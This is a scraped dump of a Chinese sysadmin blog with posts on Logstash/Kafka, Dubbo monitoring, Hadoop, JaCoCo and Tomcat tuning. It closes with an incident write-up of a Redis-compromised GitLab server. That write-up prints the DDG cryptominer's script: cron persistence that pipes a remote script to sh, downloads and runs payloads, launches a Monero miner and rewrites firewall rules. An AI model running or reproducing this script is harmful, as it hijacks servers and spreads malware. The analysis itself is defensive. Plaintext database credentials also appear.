stash－实现系统日志收集inputfile_to_kafka.conf 日志文件读出写入到kafkainput &#123;file &#123;path =&gt; \"/srv/tomcat/logs/account/logFile.*.log\"type =&gt; \"tomcat\"discover_interval =&gt; 15 #logstash&#125;&#125;output &#123;#stdout &#123; codec =&gt; rubydebug &#125;kafka&#123;bootstrap_servers =&gt; \"10.46.72.172:9092,10.47.88.103:9092,10.47.102.137:9092\"#group_id =&gt; \"logstash\"topic_id =&gt; \"logstash\"&#125;&#125;2.2 logstash indexer 配置kafka_to_es.confinput &#123;kafka &#123;zk_connect =&gt; \"10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181kafka\"group_id =&gt; \"logstash\"topic_id =&gt; \"logstash\"reset_beginning =&gt; false # boolean (optional)， default: falseconsumer_threads =&gt; 2 # number (optional)， default: 1decorate_events =&gt; false # boolean (optional)， default: false&#125;&#125;output &#123;elasticsearch &#123;hosts =&gt; [\"10.47.88.206:9200\",\"10.47.88.188:9200\"]index =&gt; \"%&#123;host&#125;-%&#123;+YYYY.MM.dd&#125;\"&#125;# stdout &#123; codec =&gt; rubydebug &#125;&#125; es安装插件head查看下效果：然后打开网站：http://elk.ihaozhuo.com/_plugin/head/ ####kibana网站效果：","raw":null,"content":null,"categories":[{"name":"日志分析平台","slug":"日志分析平台","permalink":"http://blog.yangcvo.me/categories/日志分析平台/"}],"tags":[{"name":"Log analysis platform","slug":"Log-analysis-platform","permalink":"http://blog.yangcvo.me/tags/Log-analysis-platform/"}]},{"title":"Dubbo监控Dubbo-Monitor的安装配置使用","slug":"Java-Dubbo/Dubbo监控Dubbo-Monitor的安装配置使用","date":"2016-12-21T09:44:04.000Z","updated":"2017-04-26T02:33:11.000Z","comments":true,"path":"2016/12/21/Java-Dubbo/Dubbo监控Dubbo-Monitor的安装配置使用/","link":"","permalink":"http://blog.yangcvo.me/2016/12/21/Java-Dubbo/Dubbo监控Dubbo-Monitor的安装配置使用/","excerpt":"","text":"前面我安装了Dubbo监控管控台dubbo-admin的安装配置可以到我dubbo书签🔖查看。 Dubbo Monitor 详细介绍Dubbo Monitor是针对Dubbo开发的监控系统，参考dubbo-monitor-simple改进而成，可以理解为其演化版本。该系统MySQL或者Mongodb记录日志的方式替代了dubbo-monitor-simple写文件的方式。 PS: 项目目前依赖的是dubbox的2.8.4版本，但是dubbox并没有修改过监控相关的代码，因此理论上也可以支持dubbo的最新版本。 master分支：MySQL mongodb分支：mongodb Dubbo-monitor 码云上面有共享源代码：基于Dubbox最新版本重新开发的简单监控 Dubbo-Monitor配置介绍下载监控代码： git clone https://git.oschina.net/handu/dubbo-monitor.git 第一步：创建数据库首先创建名称为monitor数据库，编码格式UTF-8。然后将项目sql文件夹下面的create.sql导入到数据库，生成dubbo_invoke表代表成功导入。 第二步：编辑项目中application.properties，配置如下： 12345678910111213141516#### Dubbo Settingsdubbo.application.name=dubbo-monitordubbo.application.owner=ihaozhuo.comdubbo.registry.address=zookeeper://10.28.32.30:2181?backup=10.47.100.23:2181,10.27.23.75:2181 ##这里我是zk多台集群。一台直接在2181后面结尾就行。dubbo.protocol.port=6060#### Database Settingsdb.url=jdbc:mysql://&lt;database_host&gt;:&lt;database_port&gt;/monitor?prepStmtCacheSize=517&amp;cachePrepStmts=true&amp;autoReconnect=true&amp;characterEncoding=utf-8 ###这里说明下&lt;database_host&gt;是数据库地址 &lt;database_port&gt; 数据库端口 monitor 数据库db.username=yjk_user 数据库用户名db.password=wrefdsf3426 数据库密码db.maxActive=500 #### System Managermanager.username=ihaozhuo 这个是登录监控的时候用户名和密码manager.password=haozhuo2015 第三步：打包运行项目执行maven命令：mvn clean packagetarget文件夹下生成的dubbo-monitor.war即为项目部署文件，将其放置到对应服务器目录下，启动服务器即可。例如：tomcat的webapps文件夹下。 第四步：访问项目启动web服务器后，访问地址：http://IP:[port]/moniotor，采用配置文件中manager.username和manager.password设置值进行登录。 服务提供端配置Dubbo服务提供端监控配置 这里放了张我们现在集群监控图：","raw":null,"content":null,"categories":[{"name":"tomcat","slug":"tomcat","permalink":"http://blog.yangcvo.me/categories/tomcat/"}],"tags":[{"name":"Java+Tomcat notes","slug":"Java-Tomcat-notes","permalink":"http://blog.yangcvo.me/tags/Java-Tomcat-notes/"},{"name":"Dubbo","slug":"Dubbo","permalink":"http://blog.yangcvo.me/tags/Dubbo/"}]},{"title":"hadoop新增节点集群启动请求异常：Last contact：200","slug":"大数据hadoop/ hadoop新增节点集群启动请求异常：Last contact：200","date":"2016-12-08T09:56:03.000Z","updated":"2017-03-14T05:45:12.000Z","comments":true,"path":"2016/12/08/大数据hadoop/ hadoop新增节点集群启动请求异常：Last contact：200/","link":"","permalink":"http://blog.yangcvo.me/2016/12/08/大数据hadoop/ hadoop新增节点集群启动请求异常：Last contact：200/","excerpt":"","text":"前言闲谈：之前做CDN云计算公司来到美年大健康现在在一家医疗大数据公司负责运维部门大大小小的活，既然是医疗大数据当然离不开大数据存储的维护，现在也同时维护大数据运维相关工作 hadoop,spark,sqoop,hue,hive,Hbase,zookeeper等等 测试开发生产使用起来,从集群环境维护 提升数据稳定性 高可用维护。 前面说了一堆自己闲聊，真正解决这次问题是hadoop新增节点需要注意哪几点： 新增节点如何新增我会在另外一篇详细说的这里我讲一些需要注意掉的问题。 需要修改几个配置：（1）hadoop data 数据目录 VERSION 里面的搭建集群时，直接克隆会出现这个问题。解决方法同上两种，最好修改${/hadoop/tmp/dir}/dfs/data/current/VERSION中的storageID，使其不同。第一种会导致hdfs数据丢失。 解决方法： 12（1） datanode启动是会加载DataStorage，如果不存在则会format（2）初次启动DataStorage的storageID是空的，所以会生成一个storageID 参考我解决的：这里我拷贝过来 直接删除。等集群namenode启动 会自动生成。 这个解决以后 新增的机器必须关闭防火墙。因为这个原因会导致我 hadoop新增节点集群启动请求异常：Last contact：200 （2） 集群重启时防火墙自动开启导致： 这里贴张图片给大家看看： 问题： 1234562012-07-04 18:43:30,475 INFO org.apache.hadoop.ipc.Client: Retrying connect to server: /192.168.18.218:9000. Already tried 8 time(s).2012-07-04 18:43:31,475 INFO org.apache.hadoop.ipc.Client: Retrying connect to server: /192.168.18.218:9000. Already tried 9 time(s).2012-07-04 18:43:31,479 ERROR org.apache.hadoop.hdfs.server.datanode.DataNode: java.io.IOException: Call to /192.168.18.218:9000 failed on local exception: java.net.NoRouteToHostException: 没有到主机的路由 at org.apache.hadoop.ipc.Client.wrapException(Client.java:775) at org.apache.hadoop.ipc.Client.call(Client.java:743)解决方法：在root权限下关闭防火墙：service iptables stop 最好配置成机器重启默认防火墙关闭： 12[root@junlings ~]# chkconfig iptables off #开机不启动防火墙服务[root@junlings ~]# chkconfig iptables on #开机启动防火墙服务 解决以后服务重新跑一遍已经搞定。","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://blog.yangcvo.me/categories/大数据/"}],"tags":[{"name":"Big data Hadoop","slug":"Big-data-Hadoop","permalink":"http://blog.yangcvo.me/tags/Big-data-Hadoop/"}]},{"title":"Sonarqube和jacoco搭建代码检查","slug":"Java-Dubbo/Sonarqube和jacoco搭建代码检查","date":"2016-12-07T09:56:03.000Z","updated":"2017-03-14T05:57:33.000Z","comments":true,"path":"2016/12/07/Java-Dubbo/Sonarqube和jacoco搭建代码检查/","link":"","permalink":"http://blog.yangcvo.me/2016/12/07/Java-Dubbo/Sonarqube和jacoco搭建代码检查/","excerpt":"","text":"准备工作：sonarqube，jacoco，git，maven，ant，sonar-runnersonarqube 去官网下载，文件太大，不能上传git，mavne，ant自己安装sonarqube和sonar-runnrt安装：查看链接 监控机子配置：启动sonarqube，git下载源代码，进入源码路径，添加一下文件； 1234561）sonar-project.properties#Set sonar-runner Configurationsonar.projectKey=haozhuo-hm-01sonar.projectVersion=6.1sonar.projectName=haozhuo-hmsonar.language=java (1). 需要分析代码的路径 1sonar.sources=src/main/java/com/haozhuo/hm/service, src/main/java/com/haozhuo/hm/dubbo (2). 这个地方很重要，工程class文件的位置，代码覆盖率就是根据这个不匹配的，如果线上的代码和线下的代码不同步，可能会造成覆盖率计算不精确。 1234567891011sonar.java.binaries=/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/targetsonar.test.binaries=testsonar.sourceEncoding=UTF-8sonar.my.property=valuesonar.java.coveragePlugin=jacoco#Path to the JaCoCo report file containing coverage data by unit tests. The path may be absolute or relative to the project base directorysonar.jacoco.reportPath=/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/jacoco.exec#Path to the JaCoCo report file containing coverage data by integration tests. The path may be absolute or relative to the project base directorysonar.jacoco.itReportPath=/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/jacoco.exec#sonar.jacoco.reportMissing.force.zerosonar.jacoco.reportMissing.force.zero=false (3). build.xml 1234567891011121314151617181920212223242526272829&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project name=\"testCodeCoveage\" default=\"all\" basedir=\".\" xmlns:jacoco=\"antlib:org.jacoco.ant\"&gt;&lt;!--&lt;property name=\"jacocoantPath\" value=\"/root/jacocoant.jar\"/&gt; &lt;property name=\"jacocoexecPath\" value=\".\"/&gt;--&gt;&lt;!-- Import the JaCoCo Ant Task --&gt;&lt;taskdef uri=\"antlib:org.jacoco.ant\" resource=\"org/jacoco/ant/antlib.xml\"&gt;&lt;classpath path=\"/srv/jacoco/jacocoant.jar\" /&gt;&lt;/taskdef&gt;&lt;target name=\"merge\" depends=\"dump\"&gt;&lt;jacoco:merge destfile=\"jacoco.exec\"&gt;&lt;!-- 导出exec文件地址，在这里统一生产一个exec文件 --&gt;&lt;fileset dir=\"/opt/haozhuo-hm/jacoco\" includes=\"*.exec\"/&gt;&lt;/jacoco:merge&gt;&lt;/target&gt;&lt;target name=\"dump\"&gt;&lt;!-- reset=\"true\"是指在dump完成之后，重置jvm中的覆盖率数据为空。append=\"true\"是指dump出来的exec文件为增量方式 --&gt;&lt;jacoco:dump address=\"192.168.1.19\" reset=\"false\" destfile=\"/opt/haozhuo-hm/jacoco/jacoco_haozhuo-hm.exec\" port=\"10001\" append=\"true\"/&gt;&lt;!-- &lt;jacoco:dump address=\"10.199.145.117\" reset=\"true\" destfile=\"/srv/jacoco/target/jacoco_10.199.145.117_2.exec\" port=\"10002\" append=\"true\"/&gt;&lt;jacoco:dump address=\"10.199.145.118\" reset=\"true\" destfile=\"/srv/jacoco/target/jacoco_10.199.145.118_1.exec\" port=\"10001\" append=\"true\"/&gt;&lt;jacoco:dump address=\"10.199.145.118\" reset=\"true\" destfile=\"/srv/jacoco/target/jacoco_10.199.145.118_2.exec\" port=\"10002\" append=\"true\"/&gt; --&gt;&lt;!--&lt;jacoco:dump address=\"10.199.170.26\" reset=\"true\" destfile=\"/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/jacoco_10.199.170.26.exec\" port=\"10001\" append=\"true\"/&gt;--&gt;&lt;/target&gt;&lt;!-- ========= The main target \"all\" ========= --&gt;&lt;target name=\"all\" depends=\"merge\" /&gt;&lt;/project&gt; (4). jacoco.sh 1234567891011121314151617181920212223242526272829303132#!/bin/sh#加载环境变量source /etc/profile#sonar-runner 路径cd /Users/yejun/software/sonar-runner-2.4/haozhuo-hm#初始化当前时间、周time=`date '+%s'`lastweek=`cat /var/run/coverage.pid`newweek=`date +%W`#获取最新代码git pull#编译最新代码，如果使用jacoco agent通过classdumpdir路径dump出来的class文件，则不需要mvn clean进行class文件编译。否则需要编译class文件。#mvn clean install -Dmaven.test.skip=true -Ptest#获取历史版本和最新版本#oldVersion=`cat /var/run/coverage.pid`newversion=`grep -r \"&lt;version&gt;\" pom.xml |awk -F \"&lt;/\" '&#123;print $1&#125;'|awk -F \"&gt;\" '&#123;print $2&#125;'`#判断如果版本未发生变更，则直接合并代码覆盖率数据;如果代码发生变更，则删除历史jacoco.exe覆盖率数据，重新统计if [ $lastweek = $newweek ];then#sed -i '/sonar.projectVersion/d' sonar-project.properties#sed -i \"2a sonar.projectVersion=$lastVersion.$time\" sonar-project.propertiesant/Users/yejun/software/sonar-runner-2.4/bin/sonar-runnerelseecho $newweek&gt;/var/run/coverage.pidrm -rf *.execsed -i '/sonar.projectKey/d' sonar-project.propertiessed -i '/sonar.projectVersion/d' sonar-project.propertiessed -i \"1a sonar.projectKey=vips-mobile-operation-key-$newweek\" sonar-project.propertiessed -i \"2a sonar.projectVersion=$newversion\" sonar-project.propertiesant/Users/yejun/software/sonar-runner-2.4/bin/sonar-runnerfi 3.被监控机子配置：1）上传一个jacocoanget.jar文件，文件在jacoco.zip里面，放到一个目录下。例如：/srv/jacoco/jacocoagent.jar 2) 修改工程tomcat/bin/下的catalina.sh，新增 1JAVA_OPTS=\"$JAVA_OPTS -javaagent:/srv/jacoco/jacocoagent.jar=includes=*,output=tcpserver,port=10001,address=192.168.1.19” 参数： 123port:如果一台机子有多个tomcat，注意端口号不要重复address：本机的ip地址其他参数一样。 3)配置完以后，到启动jacoco.sh然后执行mvn clean package，就可以到sonarqube上面查看想要的信息了。","raw":null,"content":null,"categories":[{"name":"Java","slug":"Java","permalink":"http://blog.yangcvo.me/categories/Java/"}],"tags":[{"name":"performance tuning","slug":"performance-tuning","permalink":"http://blog.yangcvo.me/tags/performance-tuning/"},{"name":"Java","slug":"Java","permalink":"http://blog.yangcvo.me/tags/Java/"}]},{"title":"记录tomcat进程CPU使用率高排查故障经验","slug":"Web服务技术/tomcat/记录tomcat进程CPU使用率高排查故障经验","date":"2016-12-02T09:56:03.000Z","updated":"2017-04-17T09:48:17.000Z","comments":true,"path":"2016/12/02/Web服务技术/tomcat/记录tomcat进程CPU使用率高排查故障经验/","link":"","permalink":"http://blog.yangcvo.me/2016/12/02/Web服务技术/tomcat/记录tomcat进程CPU使用率高排查故障经验/","excerpt":"","text":"1、故障现象运营同事反馈APP其中体检商城购买订单系统运行缓慢，访问出现超时，多次重启系统后问题依然存在，使用top命令查看服务器情况，发现CPU占用率过高。 2、CPU占用过高问题定位2.1、定位问题进程使用top命令查看资源占用情况，发现pid为14063的进程占用了大量的CPU资源，CPU占用率高达229.1%，内存占用率也达到了29.8% 123456789[root@account-tomcat-01 ~]$ toptop - 14:51:10 up 233 days, 11:40, 2 users, load average: 6.85, 5.62, 3.97Tasks: 192 total, 2 running, 190 sleeping, 0 stopped, 0 zombie%Cpu(s): 97.3 us, 0.3 sy, 0.0 ni, 2.5 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem : 16268652 total, 5114392 free, 6907028 used, 4247232 buff/cacheKiB Swap: 4063228 total, 3989708 free, 73520 used. 8751512 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 14063 root 20 0 9260488 4.627g 11976 S 229.1 29.8 117:41.66 java 2.2、定位问题线程使用ps -mp pid -o THREAD,tid,time命令查看该进程的线程情况，发现该进程的多个线程占用率很高 123456789101112131415161718[root@account-tomcat-01 ~]$ ps -mp 14063 -o THREAD,tid,time USER %CPU PRI SCNT WCHAN USER SYSTEM TID TIME 361 - - - - - - 02:05:58root 0.0 19 - futex_ - - 14063 00:00:00root 0.0 19 - poll_s - - 14064 00:00:00root 44.5 19 - - - - 14065 00:15:30root 44.5 19 - - - - 14066 00:15:30root 44.4 19 - - - - 14067 00:15:29root 44.5 19 - - - - 14068 00:15:30root 44.5 19 - - - - 14069 00:15:30root 44.5 19 - - - - 14070 00:15:30root 44.5 19 - - - - 14071 00:15:30root 44.6 19 - - - - 14072 00:15:32root 2.2 19 - futex_ - - 14073 00:00:46root 0.0 19 - futex_ - - 14074 00:00:00root 0.0 19 - futex_ - - 14075 00:00:00root 0.0 19 - futex_ - - 14076 00:00:00root 0.7 19 - futex_ - - 14077 00:00:15 从输出信息可以看出，14065~14072之间的线程CPU占用率都很高2.3、查看问题线程堆栈 挑选TID为14065的线程，查看该线程的堆栈情况，先将线程id转为16进制，使用printf “%x\\n” tid命令进行转换 12345678910111213141516[root@account-tomcat-01 ~]$ printf \"%x\\n\" 1406536f1再使用jstack命令打印线程堆栈信息，命令格式：jstack pid |grep tid -A 30[root@root-web-01 ~]$ jstack 14063 |grep 36f1 -A 30\"GC task thread#0 (ParallelGC)\" prio=10 tid=0x00007fa35001e800 nid=0x36f1 runnable \"GC task thread#1 (ParallelGC)\" prio=10 tid=0x00007fa350020800 nid=0x36f2 runnable \"GC task thread#2 (ParallelGC)\" prio=10 tid=0x00007fa350022800 nid=0x36f3 runnable \"GC task thread#3 (ParallelGC)\" prio=10 tid=0x00007fa350024000 nid=0x36f4 runnable \"GC task thread#4 (ParallelGC)\" prio=10 tid=0x00007fa350026000 nid=0x36f5 runnable \"GC task thread#5 (ParallelGC)\" prio=10 tid=0x00007fa350028000 nid=0x36f6 runnable \"GC task thread#6 (ParallelGC)\" prio=10 tid=0x00007fa350029800 nid=0x36f7 runnable \"GC task thread#7 (ParallelGC)\" prio=10 tid=0x00007fa35002b800 nid=0x36f8 runnable \"VM Periodic Task Thread\" prio=10 tid=0x00007fa3500a8800 nid=0x3700 waiting on condition JNI global references: 392 从输出信息可以看出，此线程是JVM的gc线程。此时可以基本确定是内存不足或内存泄露导致gc线程持续运行，导致CPU占用过高。 所以接下来我们要找的内存方面的问题 3.1、使用jstat -gcutil命令查看进程的内存情况 12345678910111213[root@account-tomcat-01 ~]$ jstat -gcutil 14063 2000 10 S0 S1 E O P YGC YGCT FGC FGCT GCT 0.00 0.00 100.00 99.99 26.31 42 21.917 218 1484.830 1506.747 0.00 0.00 100.00 99.99 26.31 42 21.917 218 1484.830 1506.747 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 220 1505.439 1527.355 0.00 0.00 100.00 99.99 26.31 42 21.917 220 1505.439 1527.355 0.00 0.00 100.00 99.99 26.31 42 21.917 220 1505.439 1527.355 从输出信息可以看出，Eden区内存占用100%，Old区内存占用99.99%，Full GC的次数高达220次，并且频繁Full GC，Full GC的持续时间也特别长，平均每次Full GC耗时6.8秒（1505.439/220）。根据这些信息，基本可以确定是程序代码上出现了问题，可能存在不合理创建对象的地方。 生产java应用，CPU使用率一直很高，经常达到100%，通过以下步骤完美解决，分享一下。 123456789101112131.jps 获取Java进程的PID。2.top -H -p PID 查看对应进程的哪个线程占用CPU过高。2.1 使用 ps -mp pid -o THREAD,tid,time 命令查看该进程的线程情况，发现该进程的多个线程占用率很高。3.jstack pid &gt;&gt; java.txt 导出CPU占用高进程的线程栈。使用jstack命令查看进程的堆栈情况4.echo “obase=16; PID” | bc 将线程的PID转换为16进制。5.在第二步导出的Java.txt中查找转换成为16进制的线程PID。找到对应的线程栈。6.分析负载高的线程栈都是什么业务操作。优化程序并处理问题。","raw":null,"content":null,"categories":[{"name":"Java","slug":"Java","permalink":"http://blog.yangcvo.me/categories/Java/"}],"tags":[{"name":"performance tuning","slug":"performance-tuning","permalink":"http://blog.yangcvo.me/tags/performance-tuning/"},{"name":"Java","slug":"Java","permalink":"http://blog.yangcvo.me/tags/Java/"}]},{"title":"gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？","slug":"运维安全/gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？","date":"2016-12-02T04:07:27.000Z","updated":"2017-03-14T05:53:06.000Z","comments":true,"path":"2016/12/02/运维安全/gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？/","link":"","permalink":"http://blog.yangcvo.me/2016/12/02/运维安全/gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？/","excerpt":"","text":"今天早上5点多收到阿里云的告警：服务器CPU百分百，gitlab服务器访问出现500，第一时间排查问题。毕竟这个关乎着开发今天可能无法提交代码。 第一时间我查看什么原因导致我gitlab 500。根据以往经验gitlab出现500 第一：版本出现bug，第二：服务器网络不正常，请求不到。 然后查看日志： 1234567891011121314[root@GitLab ~]# tailf -1000 /home/git/gitlab/log/production.logStarted POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:26 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:31 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:37 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:42 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:15:35 +0800Started GET \"/\" for 177.154.56.233 at 2017-01-06 10:15:55 +0800Processing by DashboardController#show as */*Completed 401 Unauthorized in 55msRedis::CommandError (NOAUTH Authentication required.): config/initializers/redis-store-fix-expiry.rb:10:in `block in setex' config/initializers/redis-store-fix-expiry.rb:10:in `setter’ 这里提示Redis需要认证，Redis::CommandError (NOAUTH Authentication required.):这里当初就没有认证的，突然需要认证，明显被人黑了。 因为redis服务在2016年3月份官网发布了一项通知：使用redis主要设置密码。可以看下这篇文章： Redis 未授权访问缺陷可轻易导致系统被黑 全球无验证可直接利用 Redis TOP 10 国家与地区 解决方案 12345678910111213临时解决方案 配置bind选项, 限定可以连接Redis服务器的IP, 并修改redis的默认端口6379.配置AUTH, 设置密码, 密码会以明文方式保存在redis配置文件中.配置rename-command CONFIG \"RENAME_CONFIG\", 这样即使存在未授权访问, 也能够给攻击者使用config指令加大难度好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config官方解决方案 暂无官方解决方案 现在版本gitlab 7.0版本的没有redis设置密码一项，所以就觉得奇怪，为什么会有人设置了密码，网站导致获取不到数据就出现500了。 查找原因：什么原因导致CPU一直100%首先SSH登陆，top查看进程，发现奇怪名字的命令AnXqV, ddg.217隐藏进程。 还有一看就感觉有问题。 知道这个进程然后我们单独看下这个进程具体有哪些： 1lsof –c ddg.217 查看关联文件，发现对外的tcp连接，不知道是不是反向shell… 从这里明显可以看的出来，我的redis-6379 被人拿到shell权限了。 从上面可以看到： 这里我到/root/.ddg/17.db这个文件我打开看是乱码加密过的。加密的 看不到数据。 这里第一步删除第一个病毒文件和加权限位：12rm -rf /root/.ddg 删除依赖。他依赖于哪个文件，然后给加一个权限位：chattr +s filename删除掉了 你手动创建，然后加权限位。 第二步分析下面IP地址：1234139.222.173.127139.70.199.90.....后面就不用解释了，这个明显当`肉鸡`了。 临时方法防火墙配置屏蔽这些IP地址。 治标不治本、 这里解决掉12506进程：kill -9 12506 配置 一个hosts 110.0.1.110 www.haveabitchin.com 配置成 百度的ip 帮他配错地址,他肯定请求下载 不到这个脚本了. 然后按进程程序目录下面进入/tmp/删除 ddg.217文件，删除duchduckgo.17.log 这个是病毒运行进程输出的日志文件，删除hsperfadata_root 这个文件里面是个进程，也删除。 然后在看看是否还有没有这个进程：又启动13929这个进程，服务还是占用很高资源CPU：100%定位到是哪个程序 发起的请求.查看：13918这个进程： 从这里明显可以看出来，这个地址： 12/bin/sh -c curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | shcurl -fsSL http://www.haveabitchin.com/ddg.x86_64 -o /tmp/ddg.217 这个明显是哪个程序一直在启动。 第三步继续排查：删除这些发现还是CPU百分百：在继续查看进程： 1root 26373 1 96 Jan01 ? 4-12:14:03 ./minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x 这个进程是什么：mined 百度告诉我们了: mined肉鸡木马 很吃CPU一种病毒。 第一步解决定位木马：1find / -name minerd 在服务器搜索所有相关minerd文件。搜索到了这个文件放在我们/home/目录下面。 第二步删除木马：查看计划任务是否有启动： 12[root@GitLab tmp]# cronte -e*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh 服务器恢复正常： 我这里就贴出了这个木马的脚本内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbinecho \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/crontabs/rootif [ ! -f \"/tmp/ddg.217\" ]; then curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217fichmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217killall /tmp/ddg.216if [ -d \"/opt/yam\" ]; then rm -rf /opt/yamfips auxf|grep -v grep|grep /tmp/duckduckgo|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"/usr/bin/cron\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"/opt/cron\"|awk '&#123;print $2&#125;'|xargs kill -9▽ps auxf|grep -v grep|grep \"/usr/sbin/ntp\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"/opt/minerd\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"mine.moneropool.com\"|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"xmr.crypto-pool.fr:8080\"|awk '&#123;print $2&#125;'|xargs kill -9#/opt/minerd -h#if [ $? != \"0\" ]; then #ps auxf|grep -v grep|grep \"/opt/minerd\" #if [ $? != \"0\" ]; then #if [ ! -f /opt/yam ]; then #curl -fsSL http://www.haveabitchin.com/yam -o /opt/yam #fi #chmod +x /opt/yam &amp;&amp; /opt/yam -c x -M stratum+tcp://4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC:x@xmr.crypto-pool.fr:443/xmr #fi#fiDoMiner()&#123; if [ ! -f \"/tmp/AnXqV\" ]; then curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV fi chmod +x /tmp/AnXqV /tmp/AnXqV -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x&#125;ps auxf|grep -v grep|grep \"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC\" || DoMinerDoRedis6379()&#123; iptables -F REDIS6379 iptables -A REDIS6379 -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT iptables -I INPUT -j REDIS6379&#125;iptables -D OUTPUT -j REDIS6379iptables -F REDIS6379iptables -X REDIS6379iptables -D INPUT -j REDIS63792iptables -F REDIS63792iptables -X REDIS63792#iptables -N REDIS6379 &amp;&amp; DoRedis6379 分析了一下，它除了自身进程外，还有3个守护进程，而且这5个进程的PID和名称每秒都在变化，估计是在不停的重建吧。 以及添加服务定时执行脚本。 123echo \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/crontabs/root 下载病毒文件，主要是截取我6379这个端口，提权，等等信息，这个文件对方做过加密的。 12345678910if [ ! -f \"/tmp/ddg.217\" ]; then curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217fichmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217killall /tmp/ddg.216if [ -d \"/opt/yam\" ]; then rm -rf /opt/yamfi 第二个病毒文件，反向代理肉鸡的木马，也加密过的。下载放到/tmp/下面 这个是临时文件。 123456789DoMiner()&#123; if [ ! -f \"/tmp/AnXqV\" ]; then curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV fi chmod +x /tmp/AnXqV /tmp/AnXqV -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x&#125;ps auxf|grep -v grep|grep \"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC\" || DoMiner 对方配置的防火墙规则： 6379 本地访问。 1234567891011121314151617181920DoRedis6379()&#123; iptables -F REDIS6379 iptables -A REDIS6379 -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT //只允许127.0.0.1访问6379 #iptables -A REDIS6379 -s 